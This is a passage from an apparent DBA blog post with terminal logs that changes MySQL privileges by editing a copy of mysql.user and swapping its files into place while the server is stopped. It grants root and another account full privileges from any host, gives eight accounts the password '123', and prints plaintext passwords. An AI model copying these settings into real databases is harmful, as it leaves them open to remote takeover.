|+--------+--------+---------+------------+------+----------------+-------------+-----------------+--------------+-----------+----------------+---------------------+---------------------+------------+-----------+----------+----------------+-----------------------------+| user_1 | MyISAM | 10 | Dynamic | 0 | 0 | 0 | 281474976710655 | 1024 | 0 | NULL | 2019-01-04 10:36:00 | 2019-01-04 10:36:00 | NULL | utf8_bin | NULL | | Users and global privileges |+--------+--------+---------+------------+------+----------------+-------------+-----------------+--------------+-----------+----------------+---------------------+---------------------+------------+-----------+----------+----------------+-----------------------------+1 row in set (0.00 sec)root@MySQL-01 10:36: [mysql]&gt; show table status like &apos;user&apos;;+------+--------+---------+------------+------+----------------+-------------+-----------------+--------------+-----------+----------------+---------------------+---------------------+---------------------+-----------+----------+----------------+-----------------------------+| Name | Engine | Version | Row_format | Rows | Avg_row_length | Data_length | Max_data_length | Index_length | Data_free | Auto_increment | Create_time | Update_time | Check_time | Collation | Checksum | Create_options | Comment |+------+--------+---------+------------+------+----------------+-------------+-----------------+--------------+-----------+----------------+---------------------+---------------------+---------------------+-----------+----------+----------------+-----------------------------+| user | MyISAM | 10 | Dynamic | 3 | 53 | 160 | 281474976710655 | 2048 | 0 | NULL | 2015-05-22 15:24:42 | 2019-01-04 09:27:49 | 2015-05-22 15:33:22 | utf8_bin | NULL | | Users and global privileges |+------+--------+---------+------------+------+----------------+-------------+-----------------+--------------+-----------+----------------+---------------------+---------------------+---------------------+-----------+----------+----------------+-----------------------------+1 row in set (0.00 sec)root@MySQL-01 10:36: [mysql]&gt; insert into user_1 select * from user;Query OK, 3 rows affected (0.00 sec)Records: 3 Duplicates: 0 Warnings: 0root@MySQL-01 10:36: [mysql]&gt; select * from user_1;+-----------+------+----------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+--------+-----------------------+| Host | User | Password | Select_priv | Insert_priv | Update_priv | Delete_priv | Create_priv | Drop_priv | Reload_priv | Shutdown_priv | Process_priv | File_priv | Grant_priv | References_priv | Index_priv | Alter_priv | Show_db_priv | Super_priv | Create_tmp_table_priv | Lock_tables_priv | Execute_priv | Repl_slave_priv | Repl_client_priv | Create_view_priv | Show_view_priv | Create_routine_priv | Alter_routine_priv | Create_user_priv | Event_priv | Trigger_priv | Create_tablespace_priv | ssl_type | ssl_cipher | x509_issuer | x509_subject | max_questions | max_updates | max_connections | max_user_connections | plugin | authentication_string |+-----------+------+----------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+--------+-----------------------+| localhost | root | | Y | Y | Y | Y | Y | Y | Y | Y | Y | Y | Y | Y | Y | Y | Y | Y | Y | Y | Y | Y | Y | Y | Y | Y | Y | Y | Y | Y | Y | | | | | 0 | 0 | 0 | 0 | | || 127.0.0.1 | root | | Y | Y | Y | Y | Y | Y | Y | Y | Y | Y | Y | Y | Y | Y | Y | Y | Y | Y | Y | Y | Y | Y | Y | Y | Y | Y | Y | Y | Y | | | | | 0 | 0 | 0 | 0 | | || ::1 | root | | Y | Y | Y | Y | Y | Y | Y | Y | Y | Y | Y | Y | Y | Y | Y | Y | Y | Y | Y | Y | Y | Y | Y | Y | Y | Y | Y | Y | Y | | | | | 0 | 0 | 0 | 0 | | |+-----------+------+----------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+--------+-----------------------+3 rows in set (0.00 sec)root@MySQL-01 10:36: [mysql]&gt; select user,host,authentication_string from user_1;+------+-----------+-----------------------+| user | host | authentication_string |+------+-----------+-----------------------+| root | localhost | || root | 127.0.0.1 | || root | ::1 | |+------+-----------+-----------------------+3 rows in set (0.00 sec)root@MySQL-01 10:36: [mysql]&gt; update user_1 set authentication_string=password(&apos;(Uploo00king)&apos;) where user=&apos;root&apos;;Query OK, 3 rows affected, 1 warning (0.01 sec)Rows matched: 3 Changed: 3 Warnings: 1root@MySQL-01 10:37: [mysql]&gt; select user,host,authentication_string from user_1;+------+-----------+-------------------------------------------+| user | host | authentication_string |+------+-----------+-------------------------------------------+| root | localhost | *D4DF57DFB7019B3D8C4294CC413AF1D650A275E4 || root | 127.0.0.1 | *D4DF57DFB7019B3D8C4294CC413AF1D650A275E4 || root | ::1 | *D4DF57DFB7019B3D8C4294CC413AF1D650A275E4 |+------+-----------+-------------------------------------------+3 rows in set (0.00 sec)root@MySQL-01 10:37: [mysql]&gt; exitBye[root@sh_02 data]# /etc/init.d/mysqld stopShutting down MySQL.. [ OK ][root@sh_02 mysql]# ll user_1*-rw-r-----. 1 mysql mysql 10630 Jan 4 10:36 user_1.frm-rw-r-----. 1 mysql mysql 328 Jan 4 10:37 user_1.MYD-rw-r-----. 1 mysql mysql 2048 Jan 4 10:37 user_1.MYI[root@sh_02 mysql]# mv user_1.frm user.frm[root@sh_02 mysql]# mv user_1.MYD user.MYD[root@sh_02 mysql]# mv user_1.MYI user.MYI[root@sh_02 mysql]# ll user*-rw-r-----. 1 mysql mysql 10630 Jan 4 10:36 user.frm-rw-r-----. 1 mysql mysql 328 Jan 4 10:37 user.MYD-rw-r-----. 1 mysql mysql 2048 Jan 4 10:37 user.MYI-rw-rw----. 1 mysql mysql 3989 Aug 14 09:14 user_view.frm[root@sh_02 mysql]# /etc/init.d/mysqld startStarting MySQL. [ OK ][root@sh_02 mysql]# mysql -uroot -p&apos;(Uploo00king)&apos;Welcome to the MariaDB monitor. Commands end with ; or \\g.Your MySQL connection id is 6Server version: 5.7.20-log MySQL Community Server (GPL)Copyright (c) 2000, 2017, Oracle, MariaDB Corporation Ab and others.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.root@MySQL-01 10:39: [(none)]&gt; show databases;+--------------------+| Database |+--------------------+| information_schema || db1 || mysql || performance_schema || sys |+--------------------+5 rows in set (0.00 sec)root@MySQL-01 10:39: [(none)]&gt; use mysqlDatabase changedroot@MySQL-01 10:39: [mysql]&gt; select user,host from mysql.user;+------+-----------+| user | host |+------+-----------+| root | 127.0.0.1 || root | ::1 || root | localhost |+------+-----------+3 rows in set (0.00 sec)root@MySQL-01 10:39: [mysql]&gt; grant all on *.* to booboo@&apos;%&apos; identified by &apos;(Uploo00king)&apos;;ERROR 1785 (HY000): Statement violates GTID consistency: Updates to non-transactional tables can only be done in either autocommitted statements or single-statement transactions, and never in the same statement as updates to transactional tables.root@MySQL-01 11:39: [mysql]&gt; update mysql.user_1 set user=&apos;aliyun_root&apos; where host=&apos;127.0.0.1&apos;;Query OK, 1 row affected (0.00 sec)Rows matched: 1 Changed: 1 Warnings: 0root@MySQL-01 11:40: [mysql]&gt; select user,host from mysql.user_1;+-------------+-----------+| user | host |+-------------+-----------+| aliyun_root | 127.0.0.1 || root | ::1 || root | localhost |+-------------+-----------+3 rows in set (0.00 sec)aliyun_root@MySQL-01 11:51: [mysql]&gt; insert into mysql.user values (&apos;%&apos;,&apos;jowing&apos;, &apos;&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;&apos;, &apos;&apos;, &apos;&apos;, &apos;&apos;, 0, 0, 0, 0, &apos;&apos;, password(&apos;Joowing@2017&apos;));Query OK, 1 row affected, 1 warning (0.01 sec)aliyun_root@MySQL-01 11:51: [mysql]&gt; select user,host from mysql.user;+-------------+-----------+| user | host |+-------------+-----------+| jowing | % || aliyun_root | 127.0.0.1 || root | ::1 || root | localhost |+-------------+-----------+4 rows in set (0.00 sec) 生产环境用户权限目标：IDC机房从库支持通过insert、update、delete命令来修改用户权限，权限比较简单，分为只读和写。 需要设置以下权限：权限作用于所有的库多有的表 用户名 密码 权限 root 123 读写 joowingbuz 123 只读 ottersync 123 只读 syncdw 123 只读 datasis 123 只读 joowingv 123 只读 datadev 123 只读 readonly 123 只读 步骤概览1234567891011121314151617181920212223# 1. 登陆数据库后操作如下：use mysql;create table user_1 like user;insert into user_1 select * from user;delete from mysql.user_1 where user=&apos;root&apos;;insert into mysql.user_1 values (&apos;%&apos;,&apos;root&apos;, &apos;&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;&apos;, &apos;&apos;, &apos;&apos;, &apos;&apos;, 0, 0, 0, 0, &apos;&apos;, password(&apos;123&apos;));insert into mysql.user_1 values (&apos;%&apos;,&apos;joowingbuz&apos;, &apos;&apos;, &apos;Y&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;&apos;, &apos;&apos;, &apos;&apos;, &apos;&apos;, 0, 0, 0, 0, &apos;&apos;, password(&apos;123&apos;));insert into mysql.user_1 values (&apos;%&apos;,&apos;ottersync&apos;, &apos;&apos;, &apos;Y&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;&apos;, &apos;&apos;, &apos;&apos;, &apos;&apos;, 0, 0, 0, 0, &apos;&apos;, password(&apos;123&apos;));insert into mysql.user_1 values (&apos;%&apos;,&apos;syncdw&apos;, &apos;&apos;, &apos;Y&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;&apos;, &apos;&apos;, &apos;&apos;, &apos;&apos;, 0, 0, 0, 0, &apos;&apos;, password(&apos;123&apos;));insert into mysql.user_1 values (&apos;%&apos;,&apos;datasis&apos;, &apos;&apos;, &apos;Y&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;&apos;, &apos;&apos;, &apos;&apos;, &apos;&apos;, 0, 0, 0, 0, &apos;&apos;, password(&apos;123&apos;));insert into mysql.user_1 values (&apos;%&apos;,&apos;joowingv&apos;, &apos;&apos;, &apos;Y&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;&apos;, &apos;&apos;, &apos;&apos;, &apos;&apos;, 0, 0, 0, 0, &apos;&apos;, password(&apos;123&apos;));insert into mysql.user_1 values (&apos;%&apos;,&apos;datadev&apos;, &apos;&apos;, &apos;Y&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;&apos;, &apos;&apos;, &apos;&apos;, &apos;&apos;, 0, 0, 0, 0, &apos;&apos;, password(&apos;123&apos;));insert into mysql.user_1 values (&apos;%&apos;,&apos;readonly&apos;, &apos;&apos;, &apos;Y&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;&apos;, &apos;&apos;, &apos;&apos;, &apos;&apos;, 0, 0, 0, 0, &apos;&apos;, password(&apos;123&apos;));# 2. 退出数据库并停止服务/data/mysql/support-files/mysql.server stop# 3. 将user_1表的物理文件覆盖user表cd /data/xtrabackup_data/mysql/mv user.frm user.ibd user.MYD user.MYI user.TRG /tmpmv user_1.frm user.frmmv user_1.MYI user.MYImv user_1.MYD user.MYD# 4. 启动数据库/data/mysql/support-files/mysql.server start 操作明细123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259root@MySQL-01 15:42: [(none)]&gt; use mysqlDatabase changedroot@MySQL-01 15:42: [mysql]&gt; create table user_1 like user;Query OK, 0 rows affected (0.01 sec)root@MySQL-01 15:42: [mysql]&gt; insert into user_1 select * from user;Query OK, 3 rows affected (0.00 sec)Records: 3 Duplicates: 0 Warnings: 0root@MySQL-01 15:42: [mysql]&gt; select user,host,authentication_string from mysql.user;+------+-----------+-------------------------------------------+| user | host | authentication_string |+------+-----------+-------------------------------------------+| root | localhost | *D4DF57DFB7019B3D8C4294CC413AF1D650A275E4 || root | 127.0.0.1 | *D4DF57DFB7019B3D8C4294CC413AF1D650A275E4 || root | ::1 | *D4DF57DFB7019B3D8C4294CC413AF1D650A275E4 |+------+-----------+-------------------------------------------+3 rows in set (0.00 sec)root@MySQL-01 15:42: [mysql]&gt; select user,host,authentication_string from mysql.user_1;+------+-----------+-------------------------------------------+| user | host | authentication_string |+------+-----------+-------------------------------------------+| root | localhost | *D4DF57DFB7019B3D8C4294CC413AF1D650A275E4 || root | 127.0.0.1 | *D4DF57DFB7019B3D8C4294CC413AF1D650A275E4 || root | ::1 | *D4DF57DFB7019B3D8C4294CC413AF1D650A275E4 |+------+-----------+-------------------------------------------+3 rows in set (0.00 sec)root@MySQL-01 15:42: [mysql]&gt; desc mysql.user_1;+------------------------+-----------------------------------+------+-----+---------+-------+| Field | Type | Null | Key | Default | Extra |+------------------------+-----------------------------------+------+-----+---------+-------+| Host | char(60) | NO | PRI | | || User | char(16) | NO | PRI | | || Password | char(41) | NO | | | || Select_priv | enum(&apos;N&apos;,&apos;Y&apos;) | NO | | N | || Insert_priv | enum(&apos;N&apos;,&apos;Y&apos;) | NO | | N | || Update_priv | enum(&apos;N&apos;,&apos;Y&apos;) | NO | | N | || Delete_priv | enum(&apos;N&apos;,&apos;Y&apos;) | NO | | N | || Create_priv | enum(&apos;N&apos;,&apos;Y&apos;) | NO | | N | || Drop_priv | enum(&apos;N&apos;,&apos;Y&apos;) | NO | | N | || Reload_priv | enum(&apos;N&apos;,&apos;Y&apos;) | NO | | N | || Shutdown_priv | enum(&apos;N&apos;,&apos;Y&apos;) | NO | | N | || Process_priv | enum(&apos;N&apos;,&apos;Y&apos;) | NO | | N | || File_priv | enum(&apos;N&apos;,&apos;Y&apos;) | NO | | N | || Grant_priv | enum(&apos;N&apos;,&apos;Y&apos;) | NO | | N | || References_priv | enum(&apos;N&apos;,&apos;Y&apos;) | NO | | N | || Index_priv | enum(&apos;N&apos;,&apos;Y&apos;) | NO | | N | || Alter_priv | enum(&apos;N&apos;,&apos;Y&apos;) | NO | | N | || Show_db_priv | enum(&apos;N&apos;,&apos;Y&apos;) | NO | | N | || Super_priv | enum(&apos;N&apos;,&apos;Y&apos;) | NO | | N | || Create_tmp_table_priv | enum(&apos;N&apos;,&apos;Y&apos;) | NO | | N | || Lock_tables_priv | enum(&apos;N&apos;,&apos;Y&apos;) | NO | | N | || Execute_priv | enum(&apos;N&apos;,&apos;Y&apos;) | NO | | N | || Repl_slave_priv | enum(&apos;N&apos;,&apos;Y&apos;) | NO | | N | || Repl_client_priv | enum(&apos;N&apos;,&apos;Y&apos;) | NO | | N | || Create_view_priv | enum(&apos;N&apos;,&apos;Y&apos;) | NO | | N | || Show_view_priv | enum(&apos;N&apos;,&apos;Y&apos;) | NO | | N | || Create_routine_priv | enum(&apos;N&apos;,&apos;Y&apos;) | NO | | N | || Alter_routine_priv | enum(&apos;N&apos;,&apos;Y&apos;) | NO | | N | || Create_user_priv | enum(&apos;N&apos;,&apos;Y&apos;) | NO | | N | || Event_priv | enum(&apos;N&apos;,&apos;Y&apos;) | NO | | N | || Trigger_priv | enum(&apos;N&apos;,&apos;Y&apos;) | NO | | N | || Create_tablespace_priv | enum(&apos;N&apos;,&apos;Y&apos;) | NO | | N | || ssl_type | enum(&apos;&apos;,&apos;ANY&apos;,&apos;X509&apos;,&apos;SPECIFIED&apos;) | NO | | | || ssl_cipher | blob | NO | | NULL | || x509_issuer | blob | NO | | NULL | || x509_subject | blob | NO | | NULL | || max_questions | int(11) unsigned | NO | | 0 | || max_updates | int(11) unsigned | NO | | 0 | || max_connections | int(11) unsigned | NO | | 0 | || max_user_connections | int(11) unsigned | NO | | 0 | || plugin | char(64) | YES | | | || authentication_string | text | YES | | NULL | |+------------------------+-----------------------------------+------+-----+---------+-------+42 rows in set (0.00 sec)root@MySQL-01 15:47: [mysql]&gt; delete from mysql.user_1 where user=&apos;root&apos;;Query OK, 3 rows affected (0.00 sec)root@MySQL-01 15:51: [mysql]&gt; insert into mysql.user_1 values (&apos;%&apos;,&apos;root&apos;, &apos;&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;Y&apos;, &apos;&apos;, &apos;&apos;, &apos;&apos;, &apos;&apos;, 0, 0, 0, 0, &apos;&apos;, password(&apos;123&apos;));Query OK, 1 row affected, 1 warning (0.00 sec)root@MySQL-01 15:52: [mysql]&gt; insert into mysql.user_1 values (&apos;%&apos;,&apos;joowingbuz&apos;, &apos;&apos;, &apos;Y&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;&apos;, &apos;&apos;, &apos;&apos;, &apos;&apos;, 0, 0, 0, 0, &apos;&apos;, password(&apos;123&apos;));Query OK, 1 row affected, 1 warning (0.00 sec)root@MySQL-01 15:52: [mysql]&gt; insert into mysql.user_1 values (&apos;%&apos;,&apos;ottersync&apos;, &apos;&apos;, &apos;Y&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;&apos;, &apos;&apos;, &apos;&apos;, &apos;&apos;, 0, 0, 0, 0, &apos;&apos;, password(&apos;123&apos;));Query OK, 1 row affected, 1 warning (0.00 sec)root@MySQL-01 15:52: [mysql]&gt; insert into mysql.user_1 values (&apos;%&apos;,&apos;syncdw&apos;, &apos;&apos;, &apos;Y&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;&apos;, &apos;&apos;, &apos;&apos;, &apos;&apos;, 0, 0, 0, 0, &apos;&apos;, password(&apos;123&apos;));root@MySQL-01 15:52: [mysql]&gt; insert into mysql.user_1 values (&apos;%&apos;,&apos;datasis&apos;, &apos;&apos;, &apos;Y&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;&apos;, &apos;&apos;, &apos;&apos;, &apos;&apos;, 0, 0, 0, 0, &apos;&apos;, password(&apos;123&apos;));Query OK, 1 row affected, 1 warning (0.00 sec)root@MySQL-01 15:52: [mysql]&gt; insert into mysql.user_1 values (&apos;%&apos;,&apos;joowingv&apos;, &apos;&apos;, &apos;Y&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;&apos;, &apos;&apos;, &apos;&apos;, &apos;&apos;, 0, 0, 0, 0, &apos;&apos;, password(&apos;123&apos;));Query OK, 1 row affected, 1 warning (0.01 sec)root@MySQL-01 15:52: [mysql]&gt; insert into mysql.user_1 values (&apos;%&apos;,&apos;datadev&apos;, &apos;&apos;, &apos;Y&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;&apos;, &apos;&apos;, &apos;&apos;, &apos;&apos;, 0, 0, 0, 0, &apos;&apos;, password(&apos;123&apos;));Query OK, 1 row affected, 1 warning (0.00 sec)root@MySQL-01 15:52: [mysql]&gt; insert into mysql.user_1 values (&apos;%&apos;,&apos;readonly&apos;, &apos;&apos;, &apos;Y&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;N&apos;, &apos;&apos;, &apos;&apos;, &apos;&apos;, &apos;&apos;, 0, 0, 0, 0, &apos;&apos;, password(&apos;123&apos;));Query OK, 1 row affected, 1 warning (0.00 sec)root@MySQL-01 15:52: [mysql]&gt; select user,host,authentication_string from mysql.user;+------+-----------+-------------------------------------------+| user | host | authentication_string |+------+-----------+-------------------------------------------+| root | localhost | *D4DF57DFB7019B3D8C4294CC413AF1D650A275E4 || root | 127.0.0.1 | *D4DF57DFB7019B3D8C4294CC413AF1D650A275E4 || root | ::1 | *D4DF57DFB7019B3D8C4294CC413AF1D650A275E4 |+------+-----------+-------------------------------------------+3 rows in set (0.00 sec)root@MySQL-01 15:52: [mysql]&gt; select user,host,authentication_string from mysql.user_1;+------------+------+-------------------------------------------+| user | host | authentication_string |+------------+------+-------------------------------------------+| ottersync | % | *9443FA914A2D69FE8832F8294E7422CC1B02A492 || joowingbuz | % | *DFFDA1CA6135E355EF468AB13A465BB5D4FE2B11 || root | % | *89BE852E4EECFD217F0C5463FB30AD25BD0751E0 || syncdw | % | *3DD7B4B4F6EE968FF3452B607BDEE6294B6A425A || datasis | % | *011D511C71990F832C531A0F9CFB34CF7BB4E485 || joowingv | % | *56B364074270DF7F6D670A6B4F5A4AD13322397A || datadev | % | *D3D73E0F6BFC3159B024EF31484B6F9CC2963C5B || readonly | % | *E2BA196C0C7F409990FDB3FAB5F9C7CE95F7C449 |+------------+------+-------------------------------------------+8 rows in set (0.00 sec)root@joowing-server-06:~# /data/mysql/support-files/mysql.server stopShutting down MySQL...... * root@joowing-server-06:~# cd /data/xtrabackup_data/root@joowing-server-06:/data/xtrabackup_data# cd mysqlroot@joowing-server-06:/data/xtrabackup_data/mysql# ll user*-rw-r----- 1 mysql mysql 10630 8月 14 15:42 user_1.frm-rw-r----- 1 mysql mysql 744 8月 14 15:52 user_1.MYD-rw-r----- 1 mysql mysql 2048 